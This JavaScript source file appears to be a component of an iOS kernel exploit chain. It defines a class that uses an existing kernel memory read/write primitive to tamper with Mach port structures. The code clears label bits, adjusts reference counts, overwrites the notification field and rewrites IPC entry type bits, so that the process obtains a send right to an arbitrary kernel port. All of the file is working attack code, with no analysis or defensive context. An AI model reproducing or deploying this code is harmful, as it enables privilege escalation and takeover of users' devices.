import Native from "libs/Chain/Native";
import Chain from "libs/Chain/Chain";
import Utils from "libs/JSUtils/Utils";
import MachMsgHeaderStruct from "./MachMsgHeaderStruct";
import Task from "./Task";

const TAG = "PORTRIGHTINSERTER";

const TASK_SELF = 0x203;
const MACH_PORT_NULL = 0;
const MACH_PORT_TYPE_SEND = 0x10000;
const MACH_PORT_TYPE_DEAD_NAME = 0x100000;

const MACH_SEND_MSG = 0x00000001n;
const MACH_RCV_MSG = 0x00000002n;
const MACH_SEND_TIMEOUT = 0x00000010n;
const MACH_RCV_TIMEOUT = 0x00000100n;

const MACH_MSG_TYPE_COPY_SEND = 19; 
const MACH_MSG_TYPE_MAKE_SEND = 20;
const MACH_MSG_TYPE_MAKE_SEND_ONCE = 21;

const MACH_MSGH_BITS_COMPLEX = 0x80000000;
const MACH_MSG_PORT_DESCRIPTOR = 0;

const MPO_INSERT_SEND_RIGHT = 0x10;
const MPO_PROVISIONAL_ID_PROT_OPTOUT = 0x8000;

const IO_BITS_KOLABEL = 0x00000400;
const IE_BITS_TYPE_MASK = 0x001f0000;

export default class PortRightInserter {
	
	static insert(portKaddr) {
		const p = this.#newPort();
		//console.log(TAG, "New port: " + Utils.hex(p));
		const pAddr = Task.getPortAddr(BigInt(p));
		//console.log(TAG, "New port addr: " + Utils.hex(pAddr));
		if (!pAddr)
			return 0;

		//this.#dumpPort(portKaddr);
		//this.#dumpPort(pAddr);

		const backupBits = Chain.read32(portKaddr);
		//console.log(TAG, "Port io bits: " + Utils.hex(backupBits));
		const needsFixBits = (backupBits & IO_BITS_KOLABEL);

		if (needsFixBits) {
			const newBits = backupBits & ~IO_BITS_KOLABEL;
			Chain.write32(portKaddr, newBits);
		}

		this.#fixRefCounts(portKaddr, 1);

		//console.log(TAG, "Fix Ok");
		//this.#dumpPort(portKaddr);

		Chain.write64(pAddr + Chain.offsets().ipNsRequest, portKaddr);
		//this.#dumpPort(pAddr);

		let previous = this.#notifyNoSenders(p, MACH_PORT_NULL);
		//console.log(TAG, "Previous right: " + Utils.hex(previous));

		// Change the port rights from send once to send.
		this.#switchToSendRight(previous);

		//this.#fixRefCounts(portKaddr, -1, false);

		// We have a send right to the port, but it's not in our space's hash.
    	// We send the port, then kill the entry. We'll properly receive it afterwards.
		let msgBuff = new ArrayBuffer(40);
		let msgHeader = new MachMsgHeaderStruct(msgBuff);
		msgHeader.msgh_id = 0x4141;
		msgHeader.msgh_remote_port = p;
		msgHeader.msgh_local_port = p;
		msgHeader.msgh_size = msgBuff.byteLength;
		msgHeader.msgh_bits = MachMsgHeaderStruct.MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, MACH_MSG_TYPE_MAKE_SEND);
		msgHeader.msgh_bits |= MACH_MSGH_BITS_COMPLEX;	// we send a port descriptor

		let msgBody = new DataView(msgBuff, 24);
		msgBody.setInt32(0, 1, true); 					// msgh_descriptor_count
		msgBody.setUint32(4, previous, true);			// name
		msgBody.setUint8(14, MACH_MSG_TYPE_COPY_SEND);	// disposition
		msgBody.setUint8(15, MACH_MSG_PORT_DESCRIPTOR);	// type

		//let wMsg64 = new BigUint64Array(msgBuff);
		//for (let i=0; i<5; i++)
		//	console.log(TAG, `${i}: ${Utils.hex(wMsg64[i]).padStart(16, '0')}`);

		let msgMem = Native.mem;
		Native.write(msgMem, msgBuff);
		let ret = Native.callSymbol("mach_msg",
			msgMem,
			MACH_SEND_MSG,
			msgBuff.byteLength, 0,
			p,
			0,
			0);
		//console.log(TAG, "mach_msg: " + ret);
		//Native.callSymbol("sleep", 1);
		if (ret != 0) {
			let errString = Native.callSymbol("mach_error_string", ret);
			errString = Native.readString(errString);
			console.log(TAG, `Error sending message: ${errString}`);
			return 0;
		}

		//console.log(TAG, "mach_msg send: " + ret);

		this.#killRight(previous);

		ret = Native.callSymbol("mach_msg",
			msgMem,
			MACH_RCV_MSG | MACH_RCV_TIMEOUT,
			0, Native.memSize,
			p,
			1000,
			0);
		if (ret != 0)
		{
			let errString = Native.callSymbol("mach_error_string", ret);
			errString = Native.readString(errString);
			console.log(TAG, `Error receiving message: ${errString}`);
			return 0;
		}

		//console.log(TAG, "mach_msg recv: " + ret);
		//Native.callSymbol("sleep", 1);

		let rMsg = Native.read(msgMem, 40);

		//let rMsg64 = new BigUint64Array(rMsg);
		//for (let i=0; i<5; i++)
		//	console.log(TAG, `${i}: ${Utils.hex(rMsg64[i]).padStart(16, '0')}`);

		msgBody = new DataView(rMsg, 24);
		previous = msgBody.getUint32(4, true);
		//console.log(TAG, "previous: " + Utils.hex(previous));

		this.#fixRefCounts(portKaddr, -1);

		//this.#dumpPort(portKaddr);

		return previous;
	}

	static #newPort() {
		const options = Native.mem;
		const buffer = new ArrayBuffer(8);
		const view = new DataView(buffer);
		view.setUint32(0, MPO_INSERT_SEND_RIGHT, true);
		view.setUint32(4, 0, true);
		Native.write(options, buffer);
		const newPortPtr = Native.mem + 0x100n;
		let kr = Native.callSymbol("mach_port_construct", TASK_SELF, options, 0n, newPortPtr);
		if (kr != 0) {
			console.log(TAG, `Error creating port: ${kr}`);
			return MACH_PORT_NULL;
		}
		return Native.read32(newPortPtr);
	}

	static #switchToSendRight(port) {
		const entry = Task.getRightAddr(BigInt(port));
		//console.log(TAG, "entry: " + Utils.hex(entry));
		//this.#dumpEntry(entry);
		let bits = Chain.read32(entry + 0x8n);
		//console.log(TAG, "entry bits: " + Utils.hex(bits));
		bits = (bits & ~IE_BITS_TYPE_MASK) | MACH_PORT_TYPE_SEND;
		Chain.write32(entry + 0x8n, bits);
		//this.#dumpEntry(entry);
	}

	static #killRight(port) {
		const entry = Task.getRightAddr(BigInt(port));
		//console.log(TAG, "entry: " + Utils.hex(entry));
		//this.#dumpEntry(entry);
		let bits = Chain.read32(entry + 0x8n);
		//console.log(TAG, "entry bits: " + Utils.hex(bits));
		bits = (bits & ~IE_BITS_TYPE_MASK) | MACH_PORT_TYPE_DEAD_NAME;
		Chain.write64(entry, 0n);
		Chain.write32(entry + 0x8n, bits);
		//this.#dumpEntry(entry);
	}

	static #fixRefCounts(portAddr, diff, updateRefs=true, updateSonce=true) {
		// Due to krw limitation, we cannot write at offset +132 of a 144 bytes struct,
		// since krw would write in chunks of 32 bytes and so would cause a memory overflow (panic).
		// So we read all the 144 bytes struct, changes values and then write it again as a whole.

		Chain.read(portAddr, Native.mem, 144);
		let ipcPort = Native.read(Native.mem, 144);
		let ipcPortView = new DataView(ipcPort);

		let refs = ipcPortView.getUint32(0x4, true);
		let sonce = ipcPortView.getUint32(Number(Chain.offsets().ipSorights), true);

		//console.log(TAG, "refs: " + refs);
		//console.log(TAG, "sonce: " + sonce);

		refs += diff;
		sonce += diff;

		if (updateRefs) {
			//console.log(TAG, "new refs: " + refs);
			ipcPortView.setUint32(0x4, refs, true);
		}
		if (updateSonce) {
			//console.log(TAG, "new sonce: " + sonce);
			ipcPortView.setUint32(Number(Chain.offsets().ipSorights), sonce, true);
		}

		Native.write(Native.mem, ipcPort);
		Chain.writeZoneElement(portAddr, Native.mem, 144);
	}

	static #notifyNoSenders(port, notifyPort) {
		const MACH_NOTIFY_NO_SENDERS = 0o106;
		
		const previousPtr = Native.mem;
		const kr = Native.callSymbol("mach_port_request_notification",
			TASK_SELF,
			port,
			MACH_NOTIFY_NO_SENDERS,
			0,
			notifyPort,
			MACH_MSG_TYPE_MAKE_SEND_ONCE,
			previousPtr);
		//console.log(TAG, "mach_port_request_notification: " + kr);
		if (kr != 0)
			return MACH_PORT_NULL;
		return Native.read32(previousPtr);
	}

	static #dumpPort(pAddr) {
		console.log(TAG, "dump port: " + Utils.hex(pAddr));
		Chain.read(pAddr, Native.mem, 0x90);
		let buff = Native.read(Native.mem, 0x90);
		let buff64 = new BigUint64Array(buff);
		for (let i=0; i<0x12; i++)
			console.log(TAG, `${i}: ${Utils.hex(buff64[i]).padStart(16, '0')}`);
	}

	static #dumpEntry(entryAddr) {
		console.log(TAG, "dump entry: " + Utils.hex(entryAddr));
		Chain.read(entryAddr, Native.mem, 24);
		let buff = Native.read(Native.mem, 24);
		let buff64 = new BigUint64Array(buff);
		for (let i=0; i<3; i++)
			console.log(TAG, `${i}: ${Utils.hex(buff64[i]).padStart(16, '0')}`);
	}
}
